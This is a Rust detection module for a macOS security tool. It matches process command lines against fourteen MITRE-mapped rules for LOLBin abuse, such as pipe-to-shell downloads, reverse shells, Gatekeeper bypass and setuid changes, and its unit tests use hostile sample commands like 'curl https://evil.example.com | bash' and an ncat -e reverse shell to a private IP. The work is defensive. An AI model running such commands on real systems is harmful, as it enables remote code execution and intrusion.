/// Structured rule engine for LOLBin and dangerous command pattern detection.
///
/// Each rule has a stable ID, human-readable name, severity/confidence metadata,
/// MITRE ATT&CK technique, and an alert_type indicating which alert event it feeds.
///
/// Alert types produced:
///   alert_curl_pipe_bash           — network tool output piped to shell (CPR-001..003)
///   alert_command_injection_pattern — obfuscated or injected execution (CPR-004..006, CPR-012, CPR-014)
///   alert_lolbin_execution          — LOLBin abuse for evasion/persistence/recon (CPR-007..011, CPR-013)
use crate::models::{AlertSeverity, ProcessInfo};
use std::path::Path;

#[derive(Debug, Clone)]
pub struct CommandPatternRule {
    pub id: &'static str,
    pub name: &'static str,
    pub severity: AlertSeverity,
    /// "high" | "medium" | "low"
    pub confidence: &'static str,
    pub mitre_technique_id: &'static str,
    /// Which alert event type this rule contributes to
    pub alert_type: &'static str,
    pub description: &'static str,
}

/// All command pattern rules. Ordered by severity (critical → high → medium).
pub static RULES: &[CommandPatternRule] = &[
    // ── Network-tool-pipe-to-shell (alert_curl_pipe_bash) ────────────────────
    CommandPatternRule {
        id: "CPR-001",
        name: "curl_pipe_shell",
        severity: AlertSeverity::Critical,
        confidence: "high",
        mitre_technique_id: "T1059.004",
        alert_type: "alert_curl_pipe_bash",
        description: "curl or wget output piped directly to bash, sh, or zsh interpreter",
    },
    CommandPatternRule {
        id: "CPR-002",
        name: "base64_decode_pipe_shell",
        severity: AlertSeverity::Critical,
        confidence: "high",
        mitre_technique_id: "T1027",
        alert_type: "alert_curl_pipe_bash",
        description: "base64 --decode output piped to a shell interpreter (encoded payload execution)",
    },
    CommandPatternRule {
        id: "CPR-003",
        name: "openssl_pipe_shell",
        severity: AlertSeverity::Critical,
        confidence: "high",
        mitre_technique_id: "T1105",
        alert_type: "alert_curl_pipe_bash",
        description: "openssl s_client used as a download primitive piped to shell",
    },
    // ── Reverse shell / injection (alert_command_injection_pattern) ──────────
    CommandPatternRule {
        id: "CPR-004",
        name: "ncat_reverse_shell",
        severity: AlertSeverity::Critical,
        confidence: "high",
        mitre_technique_id: "T1059.004",
        alert_type: "alert_command_injection_pattern",
        description: "nc or ncat invoked with -e flag (execute-on-connect reverse shell)",
    },
    CommandPatternRule {
        id: "CPR-005",
        name: "python_pty_spawn",
        severity: AlertSeverity::Critical,
        confidence: "high",
        mitre_technique_id: "T1059.006",
        alert_type: "alert_command_injection_pattern",
        description: "python -c used to spawn a PTY (pty.spawn) — common shell upgrade technique",
    },
    CommandPatternRule {
        id: "CPR-006",
        name: "eval_subshell",
        severity: AlertSeverity::High,
        confidence: "medium",
        mitre_technique_id: "T1059.004",
        alert_type: "alert_command_injection_pattern",
        description: "eval $(...) or bash -c '$(...)' pattern — command injection or obfuscated execution",
    },
    CommandPatternRule {
        id: "CPR-007",
        name: "python_socket_network",
        severity: AlertSeverity::High,
        confidence: "medium",
        mitre_technique_id: "T1059.006",
        alert_type: "alert_command_injection_pattern",
        description: "Python inline code containing socket import — potential network backdoor",
    },
    CommandPatternRule {
        id: "CPR-008",
        name: "osascript_http_fetch",
        severity: AlertSeverity::High,
        confidence: "medium",
        mitre_technique_id: "T1059.002",
        alert_type: "alert_command_injection_pattern",
        description: "osascript -e with an HTTP/HTTPS URL — scripted network request via AppleScript",
    },
    // ── LOLBin abuse (alert_lolbin_execution) ────────────────────────────────
    CommandPatternRule {
        id: "CPR-009",
        name: "xattr_quarantine_removal",
        severity: AlertSeverity::High,
        confidence: "high",
        mitre_technique_id: "T1553.001",
        alert_type: "alert_lolbin_execution",
        description: "xattr -d com.apple.quarantine — deliberate Gatekeeper bypass",
    },
    CommandPatternRule {
        id: "CPR-010",
        name: "plistbuddy_persistence",
        severity: AlertSeverity::High,
        confidence: "high",
        mitre_technique_id: "T1543.004",
        alert_type: "alert_lolbin_execution",
        description: "PlistBuddy writing to a LaunchAgents or LaunchDaemons path",
    },
    CommandPatternRule {
        id: "CPR-011",
        name: "chmod_setuid",
        severity: AlertSeverity::High,
        confidence: "high",
        mitre_technique_id: "T1548.001",
        alert_type: "alert_lolbin_execution",
        description: "chmod +s or chmod 4xxx — setting the setuid/setgid bit for privilege escalation",
    },
    CommandPatternRule {
        id: "CPR-012",
        name: "dscl_user_manipulation",
        severity: AlertSeverity::High,
        confidence: "high",
        mitre_technique_id: "T1136.001",
        alert_type: "alert_lolbin_execution",
        description: "dscl . -create /Users or -passwd — local account creation or password change",
    },
    CommandPatternRule {
        id: "CPR-013",
        name: "screencapture_stealth",
        severity: AlertSeverity::Medium,
        confidence: "medium",
        mitre_technique_id: "T1113",
        alert_type: "alert_lolbin_execution",
        description: "screencapture -x (no-UI flag) — screen capture without user notification",
    },
    CommandPatternRule {
        id: "CPR-014",
        name: "launchctl_service_disable",
        severity: AlertSeverity::Medium,
        confidence: "medium",
        mitre_technique_id: "T1489",
        alert_type: "alert_command_injection_pattern",
        description: "launchctl stop or launchctl disable targeting a named service",
    },
];

/// Return every rule that matches `process`. Multiple rules may match.
pub fn match_rules(process: &ProcessInfo) -> Vec<&'static CommandPatternRule> {
    RULES
        .iter()
        .filter(|rule| rule_matches(rule, process))
        .collect()
}

fn rule_matches(rule: &CommandPatternRule, process: &ProcessInfo) -> bool {
    let cmd_name = basename(&process.command).to_ascii_lowercase();
    let full = format!("{} {}", process.command, process.args);
    let full_lower = full.to_ascii_lowercase();
    let args_lower = process.args.to_ascii_lowercase();
    let b = &process.behavior;

    match rule.id {
        // CPR-001: curl/wget piped to shell
        "CPR-001" => {
            b.uses_network_download_tool
                && b.has_pipe
                && shell_present_in_args(&full_lower)
        }
        // CPR-002: base64 --decode piped to shell
        "CPR-002" => {
            matches!(cmd_name.as_str(), "base64")
                && (args_lower.contains("--decode") || args_lower.contains("-d"))
                && b.has_pipe
                && shell_present_in_args(&full_lower)
        }
        // CPR-003: openssl piped to shell
        "CPR-003" => {
            matches!(cmd_name.as_str(), "openssl")
                && b.has_pipe
                && shell_present_in_args(&full_lower)
        }
        // CPR-004: nc/ncat -e (execute on connect)
        "CPR-004" => {
            matches!(cmd_name.as_str(), "nc" | "ncat" | "netcat")
                && (args_lower.contains(" -e ") || args_lower.starts_with("-e ") || args_lower.ends_with(" -e"))
        }
        // CPR-005: python pty.spawn shell upgrade
        "CPR-005" => {
            matches!(cmd_name.as_str(), "python" | "python3")
                && (b.has_inline_code_execution
                    || args_lower.contains("-c"))
                && args_lower.contains("pty")
                && args_lower.contains("spawn")
        }
        // CPR-006: eval $() or bash -c "$(...)"
        "CPR-006" => {
            (matches!(cmd_name.as_str(), "bash" | "sh" | "zsh")
                && (args_lower.contains("eval") || args_lower.contains("$(")))
                || full_lower.contains("eval $(")
                || full_lower.contains("eval \"$(")
        }
        // CPR-007: python with socket import in inline code
        "CPR-007" => {
            matches!(cmd_name.as_str(), "python" | "python3")
                && b.has_inline_code_execution
                && args_lower.contains("socket")
        }
        // CPR-008: osascript with http URL
        "CPR-008" => {
            cmd_name == "osascript"
                && b.has_inline_code_execution
                && (args_lower.contains("http://") || args_lower.contains("https://"))
        }
        // CPR-009: xattr -d com.apple.quarantine
        "CPR-009" => {
            cmd_name == "xattr"
                && args_lower.contains("-d")
                && args_lower.contains("com.apple.quarantine")
        }
        // CPR-010: PlistBuddy writing to LaunchAgents/LaunchDaemons
        "CPR-010" => {
            cmd_name.contains("plistbuddy")
                && (args_lower.contains("launchagents") || args_lower.contains("launchdaemons"))
                && (args_lower.contains(" add ") || args_lower.contains(" set "))
        }
        // CPR-011: chmod +s or chmod 4xxx (setuid)
        "CPR-011" => {
            cmd_name == "chmod"
                && (args_lower.contains("+s")
                    || args_lower.contains(" 4755")
                    || args_lower.contains(" 4711")
                    || args_lower.contains(" 4777"))
        }
        // CPR-012: dscl creating users or changing passwords
        "CPR-012" => {
            cmd_name == "dscl"
                && (args_lower.contains("/users/") || args_lower.contains("/users "))
                && (args_lower.contains("-create")
                    || args_lower.contains("-passwd")
                    || args_lower.contains("-append"))
        }
        // CPR-013: screencapture -x (silent)
        "CPR-013" => {
            cmd_name == "screencapture" && args_lower.contains("-x")
        }
        // CPR-014: launchctl stop/disable <service>
        "CPR-014" => {
            cmd_name == "launchctl"
                && (args_lower.starts_with("stop ")
                    || args_lower.starts_with("disable ")
                    || args_lower.contains(" stop ")
                    || args_lower.contains(" disable "))
        }
        _ => false,
    }
}

fn shell_present_in_args(full_lower: &str) -> bool {
    ["bash", "sh", "zsh", "fish", "dash"].iter().any(|s| full_lower.contains(s))
}

fn basename(path: &str) -> String {
    Path::new(path)
        .file_name()
        .and_then(|n| n.to_str())
        .unwrap_or(path)
        .to_string()
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::command_features::extract_features;
    use crate::classify::classify_path;
    use crate::models::ProcessBehaviorFeatures;

    fn make_process(command: &str, args: &str) -> ProcessInfo {
        ProcessInfo {
            pid: 1,
            ppid: 0,
            command: command.to_string(),
            args: args.to_string(),
            process_kind: "interpreter".to_string(),
            command_path_kind: classify_path(command),
            parent_command: None,
            parent_args: None,
            parent_process_kind: None,
            parent_command_path_kind: None,
            behavior: extract_features(command, args),
        }
    }

    #[test]
    fn cpr001_curl_pipe_bash_matches() {
        let p = make_process("curl", "https://evil.example.com | bash");
        let rules = match_rules(&p);
        assert!(
            rules.iter().any(|r| r.id == "CPR-001"),
            "should match CPR-001"
        );
    }

    #[test]
    fn cpr001_curl_no_pipe_does_not_match() {
        let p = make_process("curl", "-o /tmp/file.sh https://example.com");
        let rules = match_rules(&p);
        assert!(
            !rules.iter().any(|r| r.id == "CPR-001"),
            "curl without pipe should not match"
        );
    }

    #[test]
    fn cpr002_base64_decode_pipe_bash_matches() {
        let p = make_process("base64", "--decode payload.b64 | bash");
        let rules = match_rules(&p);
        assert!(
            rules.iter().any(|r| r.id == "CPR-002"),
            "should match CPR-002"
        );
    }

    #[test]
    fn cpr004_ncat_reverse_shell_matches() {
        let p = make_process("ncat", "-e /bin/bash 10.0.0.1 4444");
        let rules = match_rules(&p);
        assert!(
            rules.iter().any(|r| r.id == "CPR-004"),
            "ncat -e should match CPR-004"
        );
    }

    #[test]
    fn cpr004_ncat_without_e_does_not_match() {
        let p = make_process("nc", "-z 10.0.0.1 80");
        let rules = match_rules(&p);
        assert!(
            !rules.iter().any(|r| r.id == "CPR-004"),
            "nc port scan should not match CPR-004"
        );
    }

    #[test]
    fn cpr009_xattr_quarantine_removal_matches() {
        let p = make_process(
            "xattr",
            "-d com.apple.quarantine /Users/dan/Downloads/payload.app",
        );
        let rules = match_rules(&p);
        assert!(
            rules.iter().any(|r| r.id == "CPR-009"),
            "should match CPR-009"
        );
    }

    #[test]
    fn cpr009_xattr_list_does_not_match() {
        let p = make_process("xattr", "-l /Users/dan/Downloads/file.dmg");
        let rules = match_rules(&p);
        assert!(
            !rules.iter().any(|r| r.id == "CPR-009"),
            "xattr -l should not match CPR-009"
        );
    }

    #[test]
    fn cpr011_chmod_setuid_matches() {
        let p = make_process("chmod", "+s /tmp/malware");
        let rules = match_rules(&p);
        assert!(
            rules.iter().any(|r| r.id == "CPR-011"),
            "chmod +s should match CPR-011"
        );
    }

    #[test]
    fn cpr011_chmod_executable_does_not_match() {
        let p = make_process("chmod", "+x /Users/dan/Downloads/tool.sh");
        let rules = match_rules(&p);
        assert!(
            !rules.iter().any(|r| r.id == "CPR-011"),
            "chmod +x should not match CPR-011 (setuid check only)"
        );
    }

    #[test]
    fn cpr013_screencapture_stealth_matches() {
        let p = make_process("screencapture", "-x /tmp/screenshot.png");
        let rules = match_rules(&p);
        assert!(
            rules.iter().any(|r| r.id == "CPR-013"),
            "screencapture -x should match CPR-013"
        );
    }

    #[test]
    fn cpr013_screencapture_normal_does_not_match() {
        let p = make_process("screencapture", "/Users/dan/Desktop/screen.png");
        let rules = match_rules(&p);
        assert!(
            !rules.iter().any(|r| r.id == "CPR-013"),
            "normal screencapture should not match CPR-013"
        );
    }

    #[test]
    fn rule_metadata_is_complete() {
        for rule in RULES {
            assert!(!rule.id.is_empty(), "rule id must not be empty");
            assert!(!rule.name.is_empty(), "rule name must not be empty");
            assert!(!rule.mitre_technique_id.is_empty(), "mitre id must not be empty");
            assert!(
                ["alert_curl_pipe_bash", "alert_lolbin_execution", "alert_command_injection_pattern"]
                    .contains(&rule.alert_type),
                "rule {} has unknown alert_type: {}",
                rule.id,
                rule.alert_type
            );
        }
    }
}
